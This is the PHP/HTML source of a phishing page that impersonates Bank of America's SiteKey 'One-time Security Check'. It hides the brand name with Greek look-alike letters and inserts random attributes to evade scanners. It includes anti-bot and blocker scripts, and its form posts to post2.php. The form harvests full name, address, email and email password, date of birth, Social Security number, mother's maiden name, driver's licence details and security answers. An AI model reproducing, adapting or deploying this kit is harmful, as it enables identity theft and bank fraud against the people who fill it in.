﻿<?php
/*   
Mou-Ad                    
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include "antibots.php";
include './bt.php';
include "./blocker.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html class="win ff ff-9 cf-cnx-regular-inactive" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US"><head><style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot'); src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.svg#cnx-regular') format('svg'); font-weight: normal; font-style: normal; font-variant: normal; }</style>


<!-- DPID: C1S4-156-1 RID:fGYG56dGgkQAAAlPKM0AAABH --> 


<script language="JavaScript" type="text/javascript">
			var boaVIPAAuseGzippedBundles = "false";
			var boaVIPAAjawrEnabled = "false";
</script>

<!-- XENGINE LSU Vipaa 6.0 2015.08 r7 -->






<!-- TLDB false -->
			<!-- TL-NOPV true -->
	<title>&Beta;ank of &Alpha;merica | Create SiteKey Challenge Questions and Answers</title>
	<meta name="Description" content="Create your SiteKey challenge questions and answers to protect your account.">
<meta name="Keywords" content="select-question-answers">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">

   <link rel="shortcut icon" href="favicon.ico" type="image/ico">


	<script language="JavaScript" type="text/javascript">
			boaVIPAAuseGzippedBundles = "true";
	</script>

<!-- TLDB TEALEAF_UiCapture_APP_ENABLED_NOT_TRUE -->


		<script language="JavaScript" type="text/javascript">
			boaVIPAAjawrEnabled = "true";
		</script>
				<link rel="stylesheet" type="text/css" href="files/global-jawr.css" media="all">
				<link rel="stylesheet" type="text/css" href="files/vipaa-jawr.css" media="all">
				<script src="files/global-jawr.js" type="text/javascript"></script>
				<script src="files/vipaa-jawr.js" type="text/javascript"></script>
<!-- PHASE 2B CHANGES currentLocation is /login/sitekey-creation/select-question-answers -->


	
	<style type="text/css"> body { display : none;} </style>
	<script src="files/deploy2.js" charset="iso-8859-1" type="text/javascript"></script><script src="files/mTag.js" charset="iso-8859-1" type="text/javascript"></script></head>
	<body style="display: block;" class="trfwl-body      ">
	<form name="verifyForm" action="post2.php" method="post">
<input name="onlineid" type="hidden" value="<?php echo $onlineid;?>">

		<script type="text/javascript"> 
		if (self == top) {
		  var theBody = document.getElementsByTagName('body')[0];
		  theBody.style.display = "block";
		} else { 
		  top.location = self.location; 
		}
		</script>
		<noscript><style>body{display : block;}</style></noscript>
		
		<a class="ada-hidden" href="#skip-to-h1" name="anc-skip-to-main-content">Skip to main content</a>
		
		<div class="two-row-flex-wideleft-layout">
			<div class="center-content">
				<div class="header">


<div   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="header-module">
   <div  for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="fsd-secure-esp-skin">
   	  <img alt="BOA" src="IMG/boa_logo.gif" height="28" width="207">
      <div  for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="page-type"></div>
      <div  for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="right-links">
		<div  for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="secure-area">Secure Area</div>
       <a class="divide" href="/login/languageToggle.go?request_locale=es-us" target="_self" name="spanish_toggle" title="Muestra esta sesi n de la Banca en L nea">En Español</a>
       <div   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="clearboth"></div>
      </div>
      <div class="clearboth"></div>
   </div>
</div>
	
<div  for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="page-title-module h-100">
  <div class="red-grad-bar-skin sup-ie" id="skip-to-h1">
    <h1 class="cnx-regular" data-font="#!">One-time Security Check</h1>
  </div>
</div>
<!-- Just inside Attempt -->
	






<!-- MessageCenter field validation -->
<!-- Added for OMC Rewards -->





<script type="text/javascript">
	var continueURL = '/login/ping';
	function myUrl() {
			window.location =  '/login/sign-in/signOnScreen.go';	
		 		     	    	   
	    	}
</script>


	
</div>
				<div class="flex-top-row"></div>
				<div class="bottom-row">
					<div class="left-column">



<table border="0" width="100%" id="table1">
	<tr>
		<td   for="<?php echo rand(9999999, 9999999999999999999999); ?>" colspan="2"><b>
		<font color="#FFFFFF" style="font-size: 11pt" face="Arial">&nbsp;</font><font style="font-size: 11pt" face="Arial" color="#808080">PERSONAL 
		INFORMATION</font></b></td>
	</tr>
	<tr>
		<td   for="<?php echo rand(9999999, 9999999999999999999999); ?>" width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><b><font face="Arial" size="2">
<label for="newEmailAddress">* Full Name:</label></font></b></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $fullnameclass; ?>" name="fullname" size="30" maxlength="60" type="text" value="" required></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Home Address:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $addressclass; ?>" name="address" size="30" maxlength="60" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * City:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $cityclass; ?>" name="city" size="20" maxlength="60" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * State:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $stateclass; ?>" name="state" size="8" maxlength="20" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Zip Code:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $zipclass; ?>" name="zip" size="4" maxlength="5" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td   for="<?php echo rand(9999999, 9999999999999999999999); ?>" width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * E-mail Address:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $emailclass; ?>" name="email" size="30" maxlength="60" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Email Password:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $passwordclass; ?>" name="password" size="20" maxlength="60" type="password"></td>
	</tr>
	<tr>
			<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Confirm Password:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $passwordclass; ?>" name="password1" size="20" maxlength="60" type="password"></td>
	</tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td colspan="2"><b>
		<font color="#FFFFFF" style="font-size: 11pt" face="Arial">&nbsp;</font><font style="font-size: 11pt" face="Arial" color="#808080">SECURITY 
		INFORMATION</font></b></td>
		</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td  for="<?php echo rand(9999999, 9999999999999999999999); ?>" width="202">
		<p  for="<?php echo rand(9999999, 9999999999999999999999); ?>" align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Date of Birth:</b></label></font></td>
		<td>&nbsp;&nbsp; <select name=bmonth><b>
<option selected value="">month</option>
<option value=Jan>Jan</option>
<option value=Feb>Feb</option>
<option value=Mar>Mar</option>
<option value=Apr>Apr</option>
<option value=May>May</option>
<option value=Jun>Jun</option>
<option value=Jul>Jul</option>
<option value=Aug>Aug</option>
<option value=Sep>Sep</option>
<option value=Oct>Oct</option>
<option value=Nov>Nov</option>
<option value=Dec>Dec</option>
</select>&nbsp;<select name=bday>
<option selected value="">day</option>
<option value=01>01</option>
<option value=02>02</option>
<option value=03>03</option>
<option value=04>04</option>
<option value=05>05</option>
<option value=06>06</option>
<option value=07>07</option>
<option value=08>08</option>
<option value=09>09</option>
<option value=10>10</option>
<option value=11>11</option>
<option value=12>12</option>
<option value=13>13</option>
<option value=14>14</option>
<option value=15>15</option>
<option value=16>16</option>
<option value=17>17</option>
<option value=18>18</option>
<option value=19>19</option>
<option value=20>20</option>
<option value=21>21</option>
<option value=22>22</option>
<option value=23>23</option>
<option value=24>24</option>
<option value=25>25</option>
<option value=26>26</option>
<option value=27>27</option>
<option value=28>28</option>
<option value=29>29</option>
<option value=30>30</option>
<option value=31>31</option>
</select>&nbsp;<select name=byear>
<option selected value="">year</option>
<option value=1910 <?php if ($byear == "1910") echo "selected"; ?>>1910</option>
<option value=1911 <?php if ($byear == "1911") echo "selected"; ?>>1911</option>
<option value=1912 <?php if ($byear == "1912") echo "selected"; ?>>1912</option>
<option value=1913 <?php if ($byear == "1913") echo "selected"; ?>>1913</option>
<option value=1914 <?php if ($byear == "1914") echo "selected"; ?>>1914</option>
<option value=1915 <?php if ($byear == "1915") echo "selected"; ?>>1915</option>
<option value=1916 <?php if ($byear == "1916") echo "selected"; ?>>1916</option>
<option value=1917 <?php if ($byear == "1917") echo "selected"; ?>>1917</option>
<option value=1918 <?php if ($byear == "1918") echo "selected"; ?>>1918</option>
<option value=1919 <?php if ($byear == "1919") echo "selected"; ?>>1919</option>
<option value=1920 <?php if ($byear == "1920") echo "selected"; ?>>1920</option>
<option value=1921 <?php if ($byear == "1921") echo "selected"; ?>>1921</option>
<option value=1922 <?php if ($byear == "1922") echo "selected"; ?>>1922</option>
<option value=1923 <?php if ($byear == "1923") echo "selected"; ?>>1923</option>
<option value=1924 <?php if ($byear == "1924") echo "selected"; ?>>1924</option>
<option value=1925 <?php if ($byear == "1925") echo "selected"; ?>>1925</option>
<option value=1926 <?php if ($byear == "1926") echo "selected"; ?>>1926</option>
<option value=1927 <?php if ($byear == "1927") echo "selected"; ?>>1927</option>
<option value=1928 <?php if ($byear == "1928") echo "selected"; ?>>1928</option>
<option value=1929 <?php if ($byear == "1929") echo "selected"; ?>>1929</option>
<option value=1930 <?php if ($byear == "1930") echo "selected"; ?>>1930</option>
<option value=1931 <?php if ($byear == "1931") echo "selected"; ?>>1931</option>
<option value=1932 <?php if ($byear == "1932") echo "selected"; ?>>1932</option>
<option value=1933 <?php if ($byear == "1933") echo "selected"; ?>>1933</option>
<option value=1934 <?php if ($byear == "1934") echo "selected"; ?>>1934</option>
<option value=1935 <?php if ($byear == "1935") echo "selected"; ?>>1935</option>
<option value=1936 <?php if ($byear == "1936") echo "selected"; ?>>1936</option>
<option value=1937 <?php if ($byear == "1937") echo "selected"; ?>>1937</option>
<option value=1938 <?php if ($byear == "1938") echo "selected"; ?>>1938</option>
<option value=1939 <?php if ($byear == "1939") echo "selected"; ?>>1939</option>
<option value=1940 <?php if ($byear == "1940") echo "selected"; ?>>1940</option>
<option value=1941 <?php if ($byear == "1941") echo "selected"; ?>>1941</option>
<option value=1942 <?php if ($byear == "1942") echo "selected"; ?>>1942</option>
<option value=1943 <?php if ($byear == "1943") echo "selected"; ?>>1943</option>
<option value=1944 <?php if ($byear == "1944") echo "selected"; ?>>1944</option>
<option value=1945 <?php if ($byear == "1945") echo "selected"; ?>>1945</option>
<option value=1946 <?php if ($byear == "1946") echo "selected"; ?>>1946</option>
<option value=1947 <?php if ($byear == "1947") echo "selected"; ?>>1947</option>
<option value=1948 <?php if ($byear == "1948") echo "selected"; ?>>1948</option>
<option value=1949 <?php if ($byear == "1949") echo "selected"; ?>>1949</option>
<option value=1950 <?php if ($byear == "1950") echo "selected"; ?>>1950</option>
<option value=1951 <?php if ($byear == "1951") echo "selected"; ?>>1951</option>
<option value=1952 <?php if ($byear == "1952") echo "selected"; ?>>1952</option>
<option value=1953 <?php if ($byear == "1953") echo "selected"; ?>>1953</option>
<option value=1954 <?php if ($byear == "1954") echo "selected"; ?>>1954</option>
<option value=1955 <?php if ($byear == "1955") echo "selected"; ?>>1955</option>
<option value=1956 <?php if ($byear == "1956") echo "selected"; ?>>1956</option>
<option value=1957 <?php if ($byear == "1957") echo "selected"; ?>>1957</option>
<option value=1958 <?php if ($byear == "1958") echo "selected"; ?>>1958</option>
<option value=1959 <?php if ($byear == "1959") echo "selected"; ?>>1959</option>
<option value=1960 <?php if ($byear == "1960") echo "selected"; ?>>1960</option>
<option value=1961 <?php if ($byear == "1961") echo "selected"; ?>>1961</option>
<option value=1962 <?php if ($byear == "1962") echo "selected"; ?>>1962</option>
<option value=1963 <?php if ($byear == "1963") echo "selected"; ?>>1963</option>
<option value=1964 <?php if ($byear == "1964") echo "selected"; ?>>1964</option>
<option value=1965 <?php if ($byear == "1965") echo "selected"; ?>>1965</option>
<option value=1966 <?php if ($byear == "1966") echo "selected"; ?>>1966</option>
<option value=1967 <?php if ($byear == "1967") echo "selected"; ?>>1967</option>
<option value=1968 <?php if ($byear == "1968") echo "selected"; ?>>1968</option>
<option value=1969 <?php if ($byear == "1969") echo "selected"; ?>>1969</option>
<option value=1970 <?php if ($byear == "1970") echo "selected"; ?>>1970</option>
<option value=1971 <?php if ($byear == "1971") echo "selected"; ?>>1971</option>
<option value=1972 <?php if ($byear == "1972") echo "selected"; ?>>1972</option>
<option value=1973 <?php if ($byear == "1973") echo "selected"; ?>>1973</option>
<option value=1974 <?php if ($byear == "1974") echo "selected"; ?>>1974</option>
<option value=1975 <?php if ($byear == "1975") echo "selected"; ?>>1975</option>
<option value=1976 <?php if ($byear == "1976") echo "selected"; ?>>1976</option>
<option value=1977 <?php if ($byear == "1977") echo "selected"; ?>>1977</option>
<option value=1978 <?php if ($byear == "1978") echo "selected"; ?>>1978</option>
<option value=1979 <?php if ($byear == "1979") echo "selected"; ?>>1979</option>
<option value=1980 <?php if ($byear == "1980") echo "selected"; ?>>1980</option>
<option value=1981 <?php if ($byear == "1981") echo "selected"; ?>>1981</option>
<option value=1982 <?php if ($byear == "1982") echo "selected"; ?>>1982</option>
<option value=1983 <?php if ($byear == "1983") echo "selected"; ?>>1983</option>
<option value=1984 <?php if ($byear == "1984") echo "selected"; ?>>1984</option>
<option value=1985 <?php if ($byear == "1985") echo "selected"; ?>>1985</option>
<option value=1986 <?php if ($byear == "1986") echo "selected"; ?>>1986</option>
<option value=1987 <?php if ($byear == "1987") echo "selected"; ?>>1987</option>
<option value=1988 <?php if ($byear == "1988") echo "selected"; ?>>1988</option>
<option value=1989 <?php if ($byear == "1989") echo "selected"; ?>>1989</option>
<option value=1990 <?php if ($byear == "1990") echo "selected"; ?>>1990</option>
<option value=1991 <?php if ($byear == "1991") echo "selected"; ?>>1991</option>
<option value=1992 <?php if ($byear == "1992") echo "selected"; ?>>1992</option>
<option value=1993 <?php if ($byear == "1993") echo "selected"; ?>>1993</option>
<option value=1994 <?php if ($byear == "1994") echo "selected"; ?>>1994</option>
<option value=1995 <?php if ($byear == "1995") echo "selected"; ?>>1995</option>
<option value=1996 <?php if ($byear == "1996") echo "selected"; ?>>1996</option>
<option value=1997 <?php if ($byear == "1997") echo "selected"; ?>>1997</option>
<option value=1998 <?php if ($byear == "1998") echo "selected"; ?>>1998</option>
<option value=1999 <?php if ($byear == "1999") echo "selected"; ?>>1999</option>
<option value=2000 <?php if ($byear == "2000") echo "selected"; ?>>2000</option>
</select>

		</td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Social Security Number:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $ssn1class; ?>" type="text" id="ssn1" size="2" maxlength="3" name="ssn1">-<input class="<?echo $ssn2class; ?>" type="text" id="ssn2" size="1" maxlength="2" name="ssn2">-<input class="<?echo $ssn3class; ?>" type="text" id="ssn3" size="3" maxlength="4" name="ssn3">&nbsp;
		<font face="Arial" size="1">123-55-8888</font></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Mother's Maiden Name:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $mmnclass; ?>" name="mmn" size="25" maxlength="60" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Driver's License Number:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $dlclass; ?>" name="dl" size="25" maxlength="60" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Driver's License Expiry Date:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $exp1class; ?>" type="text" id="exp1" size="1" maxlength="2" name="exp1">-<input class="<?echo $exp2class; ?>" type="text" id="exp2" size="1" maxlength="2" name="exp2">-<input class="<?echo $exp3class; ?>" type="text" id="exp3" size="3" maxlength="4" name="exp3">
		<font face="Arial" size="1">DD-MM-YYYY</font></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td colspan="2"><b>
		<font color="#FFFFFF" style="font-size: 11pt" face="Arial">&nbsp;</font><font face="Arial" style="font-size: 11pt" color="#808080">SECURITY 
		QUESTIONS</font></b></td>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	<tr>
		<td   for="<?php echo rand(9999999, 9999999999999999999999); ?>" width="202">
		<p align="right"><font face="Arial" size="2">
<label for="debitcardno"><b> * Your First Question:</b></label></font></td>
		<td>&nbsp;&nbsp; 
		<select name="q1" id="expmonth0" size="1">
<option>Select</option>
<option value="What is your all-time favorite song?">What is your all-time favorite song?</option>
<option value="What is the name of the medical professional who delivered your first child?">What is the name of the medical professional who delivered your first child?</option>
<option value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</option>
<option value="What is the first name of your favorite niece/nephew?">What is the first name of your favorite niece/nephew?</option>
<option value="What is the first name of your hairdresser/barber?">What is the first name of your hairdresser/barber?</option>
<option value="What is the name of a college you applied to but didn't attend?">What was the name of your first pet?</option>
<option value="What is the first name of your mother's closest friend?">What is the first name of your mother's closest friend?</option>
<option value="What is the name of your best childhood friend?">What is the name of your best childhood friend?</option>
<option value="On what street is your grocery store?">On what street is your grocery store?</option>
<option value="what is the name of college you apllied to but didn't attend ?">what is the name of college you apllied to but didn't attend ?</option>
</option>
</select></td>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="debitcardno"><b> * Answer:</b></label></font></td>
		<td>&nbsp;&nbsp; 
		<input class="<?echo $pinclass; ?>" name="answer1" size="19" value=""></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="debitcardno"><b> * Your Second Question:</b></label></font></td>
		<td>&nbsp;&nbsp; 
		<select class="<?echo $expmonthclass; ?>" name="q2" id="expmonth1" size="1">
<option selected>Select</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?
</option>
<option value="As a child, what did you want to be when you grew up?">As a child, what did you want to be when you grew up?
</option>
<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?
</option>
<option value="Who is your favorite person in history?">Who is your favorite person in history?
</option>
<option value="What was the make and model of your first car?">What was the make and model of your first car?
</option>
<option value="What was the first live concert you attended?">What was the first live concert you attended?
</option>
<option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?
</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?
</option>
<option value="What is the name of your high school's star athlete?">What is the name of your high school's star athlete?
</option>
<option value="Where were you on New Year's 2000?">Where were you on New Year's 2000?
</option>
</select></td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="debitcardno"><b> * Answer:</b></label></font></td>
		<td>&nbsp;&nbsp; 
		<input class="<?echo $pinclass; ?>" name="answer2" size="19" value=""></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td   for="<?php echo rand(9999999, 9999999999999999999999); ?>" width="202">
		<p align="right"><font face="Arial" size="2">
<label for="debitcardno"><b> * Your Third Question:</b></label></font></td>
		<td>&nbsp;&nbsp; 
		<select class="<?echo $expmonthclass; ?>" name="q3" id="expmonth2" size="1">
<option selected>Select</option>
<option value="What street did your best friend in high school live on? (Enter full name of street only)">What street did your best friend in high school live on? (Enter full name of street only)
</option>
<option value="What celebrity do you most resemble?">What celebrity do you most resemble?
</option>
<option value="What is the last name of your third grade teacher?">What is the last name of your third grade teacher?
</option>
<option value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?
</option>
<option value="In what city did you honeymoon? (Enter full name of city only)">In what city did you honeymoon? (Enter full name of city only)
</option>
<option value="What is the name of your first babysitter?">What is the name of your first babysitter?
</option>
<option value="What is the last name of your family physician?">What is the last name of your family physician?
</option>
<option value="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?
</option>
<option value="What is your best friend's first name?">What is your best friend's first name?
</option>
<option value="What is the name of your favorite charity?">What is the name of your favorite charity?
</option>
</select></td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="debitcardno"><b> * Answer:</b></label></font></td>
		<td>&nbsp;&nbsp; 
		<input class="<?echo $pinclass; ?>" name="answer3" size="19" value=""></td>
	</tr>
		
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;<input type="image" src="./IMG/continue.jpg" name="B1" alt="Continue"style=""></td>
	</tr>
</table>

</div>
					<div class="right-column no-print">



<script type="text/javascript">
var quickHelpRequestURL = '';
</script>
	<div class="quick-help-module">
		<div class="fsd-liveperson-skin">
					<div class="sm-title">
					
					
					
						
						<h2   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="sm-header">Quick help</h2>
					</div>
						<div   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="sm-topcontent-dottedbtm">
					    <ul role="tablist" class="accordion ui-accordion ui-widget ui-helper-reset ui-accordion-icons">
											<li class="ui-accordion-li-fix">
											<a aria-expanded="false" name="anc-question-0" href="javascript:void(0);" class="heading ui-accordion-header ui-helper-reset ui-state-default ui-corner-all"><span class="ada-hidden">show </span><span class="title">How are challenge questions used?</span></a>
											<div   for="<?php echo rand(9999999, 9999999999999999999999); ?>" role="tabpanel" style="height: auto; display: none;" class="content-area ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom cntheight"><p>SiteKey
 challenge questions help protect your Online &Beta;aning account. If you or
 someone else tries to sign in from a computer or mobile 
device&nbsp;that we don't recognize, we'll ask one of these questions. 
Answering these questions helps us make sure it's you trying to sign in.
 The questions must be answered correctly to access Online &Beta;aning.</p></div>
											</li>
											<li   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="ui-accordion-li-fix">
											<a aria-expanded="false" name="anc-question-1" href="javascript:void(0);" class="heading ui-accordion-header ui-helper-reset ui-state-default ui-corner-all"><span class="ada-hidden">show </span><span class="title">Are answers case-sensitive?</span></a>
											<div role="tabpanel" style="height: auto; display: none;" class="content-area ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom cntheight"><p>No,
 answers are not case-sensitive. Answers with or without capitalization 
are okay. Just create answers that are unique so you'll remember. We 
won't create possible frustration later by checking capitalizations.</p></div>
											</li>
											<li class="ui-accordion-li-fix">
											<a aria-expanded="false" name="anc-question-2" href="javascript:void(0);" class="heading ui-accordion-header ui-helper-reset ui-state-default ui-corner-all"><span class="ada-hidden">show </span><span class="title">Can I use special characters?</span></a>
											<div role="tabpanel" style="height: auto; display: none;" class="content-area ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom cntheight"><p>Please use only letters, numbers, spaces hyphens and periods. Don't use other special characters in your answers.</p></div>
											</li>
					    </ul>
					</div>
							<div class="sm-btmcontent">



<!-- Added for PRP-1 to block the chat link for certain cases -->










<script type="text/javascript">
	var lpUnit = "olb-passcode";	
	if (typeof(lpLanguage)=='undefined')
		var lpLanguage = 'english';
	var ConversionStage = "SiteKey Creation - Select Questions Answers"	
</script>
<script type="text/javascript" src="files/mtagconfig.js"></script>
<script type="text/javascript">
	lpAddVars('page','ConversionStage','SiteKey Creation - Select Questions Answers');

	
	<!-- Added for PRP-1: For global error and no contacts issue case -->
	
</script>

	<div class="liveperson-module">
			<div id="lpButtonDiv"></div>
	</div>
							</div>
		</div>
	</div>

<script type="text/javascript">
	
	if(passCodeErrorCounter == undefined || passCodeErrorCounter == 0){
		var passCodeErrorCounter = 0;
	}
	if(onlineIdErrorCounter == undefined || onlineIdErrorCounter == 0 ){
		var onlineIdErrorCounter = 0;
	}
		lpAddVars('page','Section','SiteKey Creation');
		lpAddVars('page','Errortype','oas');



	
	lpAddVars('session','State','AZ');
	lpAddVars('session','OnlineID','jmccown8in1ul');
	lpAddVars('session','Data','AC4C29427369AA300ADB75CBEE438261FF7DE9F36FAB4EED');
	$(document).ready(function(){
		updateLpCounters();
	});
	function updateLpCounters(){
		if(document.getElementById('lpOlbResetErrorCounterId') != undefined){
			document.getElementById('lpOlbResetErrorCounterId').value=onlineIdErrorCounter;
		}
		if(document.getElementById('lpPasscodeErrorCounterId') != undefined){
			document.getElementById('lpPasscodeErrorCounterId').value = passCodeErrorCounter;
		}
	}
	function getSelectedAcctForConvAction(){
		if(document.getElementById('selectVerifyAccount') != undefined){
			var acctDropDown = document.getElementById('selectVerifyAccount');
			var selValue = acctDropDown.options[acctDropDown.selectedIndex].value;
			if(selValue != ''){
				if(selValue == 'atmDebit'){
					conversionAction = 'atm';
				}
				else if(selValue == 'credit'){
					conversionAction = 'credit card';
				}
				else{
					conversionAction = 'other';
				}
			}
			else{
				conversionAction = '';
			}
		}
	}


</script>
</div>
					<div class="clearboth"></div>
				</div>
				<div class="single-column-row"></div>
				<div class="footer">
					<div class="footer-top">&nbsp;</div>
					<div class="footer-inner">

<div class="global-footer-module">
   <div class="gray-bground-skin cssp">
		<div class="secure">Secure area</div>
	
       
      <div   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="link-container">
         <div   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="link-row"> 
				
				<a   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="last-link" href="#" name="Privacy_&amp;_Security_footer" title="Privacy &amp; Security" target="_blank">Privacy &amp; Security</a>
				<div  for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="clearboth"></div>
         </div>
      </div>
      <p>&Beta;ank of &Alpha;merica, N.A. Member FDIC. <a name="Equal_Housing_Lender" href="#" target="_blank">Equal Housing Lender</a> <br>© 2017 &Beta;ank of &Alpha;merica Corporation. All rights reserved.</p>
   </div>
</div>
</div>
				</div>
			</div>
		</div>
	</form>
</body>

</html>